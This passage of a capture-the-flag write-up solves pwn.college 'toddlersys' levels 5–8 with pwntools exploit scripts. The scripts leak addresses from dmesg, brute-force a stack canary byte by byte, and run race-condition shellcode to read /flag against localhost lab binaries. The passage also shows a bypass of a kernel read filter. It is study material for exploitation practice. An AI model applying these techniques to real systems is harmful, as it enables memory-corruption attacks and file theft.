    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer

def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)

def store_in_memory(addr, register):
    return instruction(Opcodes.STM, addr, register)

def load_from_memory(addr, register):
    return instruction(Opcodes.LDM, addr, value)

def write_register(register, value):
    assert(value < 0x100)
    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))

def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer

def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer

def open_file(file_addr, flags=0, mode=0):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def read_to_memory(fd, offset, count, adjusted=False):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    if adjusted:
        buffer += instruction(Opcodes.IMM, Syscalls.READ_MEM, Regs.a)
    else:
        buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_from_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def store_string(addr, string):
    assert(type(string) == bytes)
    buffer = b''
    for i, b in enumerate(string):
        buffer += write_register(Regs.a, b)
        buffer += write_register(Regs.b, addr + i)
        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
    return buffer

def gen_yancode(adjusted=False):
    flag_path = b'/flag\x00'
    flag_addr = 0
    flag_content_addr = flag_addr + len(flag_path)
    max_size = 0x80
    out_file_path = b'/home/hacker/OUT\x00'
    out_file_addr = max_size
    
    with open(out_file_path[:-1], 'wb') as f:
        pass

    yancode = b''
    # Store "flag" in mem[0]
    yancode += store_string(addr=flag_addr, string=flag_path)
    # open("/flag", O_RDONLY, 0)
    yancode += open_file(file_addr=flag_addr)
    # read(fd, &mem[0], 0x50)
    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=max_size, adjusted=adjusted)

    # Store out filename in mem[0x80]
    yancode += store_string(addr=out_file_addr, string=out_file_path)
    yancode += open_file(file_addr=out_file_addr, flags=2)
    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)
    
    yancode += b'\x00' * (MAX_YANCODE_SIZE - len(yancode))
    return yancode


SHELLCODE = '''
read_mmap:
mov rbx, {0}
mov rcx, [rbx]
mov [rip + saved_mmap_addr], rcx

do_clone:
mov r9, QWORD PTR fs:0x10
xor r8, r8
lea r10, [r9 + 0x2d0]
xor rdx, rdx
xor rsi, rsi
mov rdi, 0x1200011
mov rax, 56
syscall
cmp rax, 0
jne parent

child:
mov rbx, [rip + saved_mmap_addr]
add rbx, 72
mov cl, {1}
mov dl, {2}

race_loop:
mov byte ptr [rbx], cl
mov byte ptr [rbx], dl
jmp race_loop

parent:

ioctl_loop:
mov rdi, 4
mov rsi, 1337
mov rax, 16
syscall
jmp ioctl_loop

saved_mmap_addr:
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
'''

def load_program(p, program_index, yancode):
    buf = b'load_program '
    buf += str(program_index).encode() + b' '
    p.send(buf)
    p.send(yancode)

def init_ypu(p, ypu_index, program_index, batch=1):
    buf = b'init_ypu '
    buf += str(ypu_index).encode() + b' '
    buf += str(program_index).encode() + b' '
    buf *= batch
    p.send(buf)

def run_ypu(p, ypu_index, batch=1):
    buf = b'run_ypu '
    buf += str(ypu_index).encode() + b' '
    buf *= batch
    p.send(buf)

def quit(p):
    buf = b'quit '
    p.send(buf)

def get_leaks():
    r0 = remote('localhost', 1337)
    crash_program = 15
    crashing_yancode = b'A' * MAX_YANCODE_SIZE
    load_program(r0, crash_program, crashing_yancode)
    quit(r0)

    dmesg = process('dmesg | grep traps | tail -n 1', shell=True)
    dmesg.recvuntil(b'ip:')
    ip_leak = int(dmesg.recvuntil(b' '), 16)
    dmesg.recvuntil(b'sp:')
    sp_leak = int(dmesg.recvuntil(b' '), 16)
    dmesg.kill()

    log.info(f'ip_leak: {hex(ip_leak)} sp_leak: {hex(sp_leak)}')
    return ip_leak, sp_leak

def main():    
    p = process(BINARY)
    input("Press enter to start..")
    log.info("Exploit starts!")
 
    ip_leak, sp_leak = get_leaks()
    pie_base = ip_leak - 0x172f
    log.info(f'pie_base: {hex(pie_base)}')
    assert(pie_base & 0xfff == 0)
    
    r1 = remote('localhost', 1337)
    input("Press enter to load yancode to mmap'ed buffer..")
    yancode_program = 0
    yancode = gen_yancode()
    load_program(r1, yancode_program, yancode)

    target_ypu = 0
    init_ypu(r1, target_ypu, yancode_program)

    input("Press enter to load and execute shellcode..")
    ypu_0_mmap_addr = pie_base + binary.symbols['data'] + 8
    log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')

    shellcode_program = 0
    shellcode = b'\x90' * 0x100
    shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, ord(Opcodes.CMP), ord(Opcodes.SYSCALL)))
    shellcode += b'\x90' * (MAX_YANCODE_SIZE - len(shellcode))
    load_program(r1, shellcode_program, shellcode)

    shellcode_addr = sp_leak - 0x3008
    trampoline_program = 15
    trampoline = p64(shellcode_addr)
    trampoline *= int(MAX_YANCODE_SIZE / 8)
    load_program(r1, trampoline_program, trampoline)
    quit(r1)

    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 6

Similar to before, but now there's a canary. We can just brute-force it - byte after byte. Notice that due to the `read(0, buf, 0x1000)` call, we have to halt between dispatching inputs towards the remote process. \
Usually we can detect crash criteria due to canary corruption by having `***stack smasing detected***` banner being emitted to `stderr`. However, notice that under the hood, `__stack_chk_fail` actually calls `writev`. Because of the seccomp filter, this results with `Bad Syscall` prompt. We can inspect a generated `dmesg` entry, that describes the crash reason, along with its `pid`. If its `pid` matches the connection we've just launched, we know for sure that stack corruption have occured.

```python
def leak_canary(pad_size, debug=False):
    crash_program = 15
    current = b'A' * pad_size

    # Initialization step, we must create 1 false entry
    with remote('localhost', 1337) as r:
        buf = current + b'A' * 8
        load_program(r, crash_program, buf)
        time.sleep(0.1)
        r.sendline(b'quit')

    canary = b''
    while True:
        for b in range(256):
            log.info(f'canary: {canary} b: {b}')
            with remote('localhost', 1337) as r:
                candidate = current + b.to_bytes(1, 'little')
                load_program(r, crash_program, candidate)
                time.sleep(0.1)
                with process('pgrep -f challenge | tail -n 2', shell=True) as pgrep:
                    r_pid = pgrep.readline()[:-1]
                    r_pid = int(r_pid, 10)
                r.sendline(b'quit')

                time.sleep(0.2)
                with process('dmesg | grep /challenge/toddlersys_level | grep audit | tail -n 1', shell=True) as dmesg:
                    dmesg.recvuntil(b'pid=')
                    crashed_pid = int(dmesg.recvuntil(b' ')[:-1], 10)
                    
                if crashed_pid == r_pid:
                    continue
                
                # Double check
                with process('dmesg | grep /challenge/toddlersys_level | grep audit | tail -n 1', shell=True) as dmesg:
                    dmesg.recvuntil(b'pid=')
                    crashed_pid = int(dmesg.recvuntil(b' ')[:-1], 10)
                
                if crashed_pid != r_pid:
                    log.info(f'NEW BYTE FOUND: {hex(b)}')
                    canary += b.to_bytes(1, 'little')
                    current = candidate
                    if debug:
                        canary = input('write the canary value\n')
                        return int(canary, 16)
                    if len(canary) == 8:
                        return u64(canary)


def get_leaks(canary):
    with remote('localhost', 1337) as r0:
        crash_program = 15
        crashing_yancode = p64(canary)
        crashing_yancode *= int(MAX_YANCODE_SIZE / 8)
        load_program(r0, crash_program, crashing_yancode)
        time.sleep(0.1)
        quit(r0)

    time.sleep(2)

    with process('dmesg | grep traps | tail -n 1', shell=True) as dmesg:
        dmesg.recvuntil(b'ip:')
        ip_leak = int(dmesg.recvuntil(b' '), 16)
        dmesg.recvuntil(b'sp:')
        sp_leak = int(dmesg.recvuntil(b' '), 16)

    log.info(f'ip_leak: {hex(ip_leak)} sp_leak: {hex(sp_leak)}')
    return ip_leak, sp_leak

def main():    
    p = process(BINARY)
    input("Press enter to start..")
    log.info("Exploit starts!")

    pad_size = 0x318
    canary = leak_canary(pad_size, debug=False)
    log.info(f'canary: {hex(canary)}')

    ip_leak, sp_leak = get_leaks(canary)
    pie_base = ip_leak - 0x175d
    log.info(f'pie_base: {hex(pie_base)}')
    assert(pie_base & 0xfff == 0)
    

    r1 = remote('localhost', 1337)   
    input("Press enter to load yancode to mmap'ed buffer..")
    yancode_program = 0
    yancode = gen_yancode()
    load_program(r1, yancode_program, yancode)

    target_ypu = 0
    init_ypu(r1, target_ypu, yancode_program)


    input("Press enter to load shellcode..")
    ypu_0_mmap_addr = pie_base + binary.symbols['data'] + 8
    log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')

    shellcode_program = 0
    shellcode = b'\x90' * 0x100
    shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, ord(Opcodes.CMP), ord(Opcodes.SYSCALL)))
    shellcode += b'\x90' * (MAX_YANCODE_SIZE - len(shellcode))
    load_program(r1, shellcode_program, shellcode)

    input("Press enter to load trampoline..")
    shellcode_addr = sp_leak - 0x2fa8
    trampoline_program = 15
    trampoline = b'A' * pad_size 
    trampoline += p64(canary) + p64(shellcode_addr) * 2
    trampoline += b'B' * (MAX_YANCODE_SIZE - len(trampoline))
    load_program(r1, trampoline_program, trampoline)

    input("Press enter to jump to shellcode..")
    quit(r1)
    
    p.interactive()
```

## Challenge 7

Similar to challenge 6, but now `sys_read` kernel handler is adjusted. After some RE, I've found out this handler actually copies the content of the underlying read to some temporary kernel buffer, and performs the following check:

```c
if (((c - 0x7b) & 0x7d) == 0)
{
    state->signal = -42;
}
```

In other words, if the content of the underlying read contains the characters `'{' , '}'`, as the flag does, the read is stopped right away. If we can adjust the `struct file` underlying pos, we can bypass this. This should require kernel addresses manipulation though. \
Another easier way, is to simply write `A * 12` to the flag, overwriting `pwn.college{` string. We can set the exact bytes to be read as the flag's exact length, in order to not reach the ending `}`. \
I've only needed to adapt `gen_yancode`, and the exploit have worked in a similar manner to level 6:

```python
def gen_yancode(adjusted=False):
    flag_path = b'/flag\x00'  
    flag_addr = 0
    flag_content = b'A' * 12  # Overwrite "pwn.college{"
    flag_content_addr = flag_addr + len(flag_path)
    precise_flag_length = 42
    max_size = 0x80
    out_file_path = b'/home/hacker/OUT\x00'
    out_file_addr = max_size
    
    with open(out_file_path[:-1], 'wb') as f:
        pass

    yancode = b''
    # Store "/flag\x00" and its preceding content in mem[0]
    yancode += store_string(addr=flag_addr, string=flag_path + flag_content)
    # open("/flag", O_RDWR, 0)
    yancode += open_file(file_addr=flag_addr, flags=2)
    # Overwrite the flag's header
    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=len(flag_content))

    yancode += write_register(Regs.a, 0)
    # Read the precise amount of the flag's length
    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=precise_flag_length, adjusted=adjusted)

    # Store out filename in mem[0x80]
    yancode += store_string(addr=out_file_addr, string=out_file_path)
    yancode += open_file(file_addr=out_file_addr, flags=2)
    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)
    
    yancode += b'\x00' * (MAX_YANCODE_SIZE - len(yancode))
    return yancode
```

## Challenge 8

Same as 7, but this time KASLR is on. Because my previous exploit doesn't relies on kernel addresses at all, the same solution applies. \
I assume the intended solution for these challenge was to find a kernel vuln, overwrite the `pos `of the file. Kernel leakage for this challenge can be done as I've initially described within challenge 5. 


[linux-kernel-labs-vma]: https://linux-kernel-labs.github.io/refs/pull/222/merge/labs/memory_mapping.html
[litux-vma]: https://litux.nl/mirror/kerneldevelopment/0672327201/ch14lev1sec2.html
